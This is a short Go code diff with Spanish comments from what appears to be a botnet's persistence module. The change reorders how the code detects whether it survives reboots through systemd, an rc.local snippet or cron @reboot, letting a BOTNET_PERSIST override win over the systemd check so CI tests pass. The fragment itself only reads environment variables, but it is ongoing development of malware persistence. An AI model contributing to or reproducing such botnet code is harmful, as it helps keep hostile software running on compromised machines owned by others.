@@ -182,15 +182,19 @@ func (SystemCron) Remove() error {
 // systemd (INVOCATION_ID lo delata — lo inyecta systemd en cada
 // unidad—), rc.local (nuestro snippet exporta BOTNET_PERSIST=rc) o
 // cron @reboot (lo demas). El modo se loguea como persist=<modo>.
+// PersistMode: el override explícito BOTNET_PERSIST manda sobre la
+// detección por entorno; si no, systemd (INVOCATION_ID) o reboot. El
+// runner de CI define INVOCATION_ID y sin esta precedencia pisaba al
+// snippet de rc.local en los tests.
 func PersistMode(getenv func(string) string) string {
 	if getenv == nil {
 		getenv = os.Getenv
 	}
-	if getenv("INVOCATION_ID") != "" {
-		return "systemd"
-	}
 	if getenv("BOTNET_PERSIST") == "rc" {
 		return "rc"
+	}
+	if getenv("INVOCATION_ID") != "" {
+		return "systemd"
 	}
 	return "reboot"
 }
